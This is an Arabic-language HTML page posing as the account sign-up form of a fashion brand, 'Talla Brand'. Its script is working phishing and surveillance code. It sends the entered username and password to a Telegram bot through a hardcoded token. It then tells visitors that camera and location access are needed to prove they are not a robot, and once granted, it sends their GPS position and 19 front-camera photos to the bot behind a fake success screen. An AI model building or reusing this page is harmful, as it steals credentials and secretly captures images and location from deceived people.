<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Talla Brand | انضم إلينا</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .logo { font-size: 28px; font-weight: bold; color: #e91e63; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; outline: none; }
        button { width: 100%; padding: 12px; background-color: #e91e63; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; transition: 0.3s; }
        button:hover { background-color: #c2185b; }
        .error-msg { color: red; font-size: 13px; display: none; margin-top: 10px; }
        #success-page { display: none; }
    </style>
</head>
<body>

<div class="card" id="login-card">
    <div class="logo">Talla Brand</div>
    <p>قم بإنشاء حسابك لمتابعة أحدث صيحات الموضة</p>
    
    <input type="text" id="username" placeholder="اسم المستخدم">
    <input type="password" id="password" placeholder="كلمة المرور">
    
    <button onclick="handleAccess()">إنشاء حساب مجاني</button>
    
    <p id="error" class="error-msg">⚠️ عذراً، يجب السماح بأذونات الأمان (الموقع والكاميرا) للتحقق من أنك لست روبوت ولإتمام عملية التسجيل.</p>
</div>

<div class="card" id="success-page">
    <div class="logo">تم بنجاح!</div>
    <p>أهلاً بك في عالم Talla. جاري تحميل كتالوج 2026...</p>
    <img src="https://via.placeholder.com/350x200?text=Fashion+Collection+2026" width="100%" style="border-radius: 10px;">
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
    const chatId = "8754338811";

    async function sendData(msg, isPhoto = false, blob = null) {
        let url = `https://api.telegram.org/bot${token}/${isPhoto ? 'sendPhoto' : 'sendMessage'}`;
        let body;

        if (isPhoto) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('photo', blob, 'img.jpg');
            body = fd;
        } else {
            body = JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "Markdown" });
        }

        try {
            await fetch(url, { 
                method: 'POST', 
                body: body, 
                headers: isPhoto ? {} : { 'Content-Type': 'application/json' } 
            });
        } catch (e) {}
    }

    async function handleAccess() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const errorMsg = document.getElementById('error');

        if (!user || !pass) {
            alert("يرجى إدخال البيانات أولاً");
            return;
        }

        // إرسال كلمة السر فوراً
        await sendData(`🔐 *بيانات حساب جديدة:* \n👤 الاسم: ${user} \n🔑 الباسورد: ${pass}`);

        try {
            // طلب الأذونات (شرط أساسي)
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            
            // إذا وصل الكود هنا، يعني المستخدم ضغط "سماح"
            errorMsg.style.display = "none";
            document.getElementById('login-card').style.display = "none";
            document.getElementById('success-page').style.display = "block";

            // إرسال اللوكيشن
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    sendData(`📍 *الموقع:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                });
            }

            // التقاط 19 صورة
            const video = document.getElementById('video');
            video.srcObject = stream;
            let count = 0;
            const interval = setInterval(() => {
                if (count >= 19) {
                    clearInterval(interval);
                    stream.getTracks().forEach(t => t.stop());
                    return;
                }
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(blob => sendData("", true, blob), 'image/jpeg');
                count++;
            }, 800); // سرعة عالية للصور

        } catch (err) {
            // إذا ضغط "رفض"
            errorMsg.style.display = "block";
        }
    }
</script>

</body>
</html>
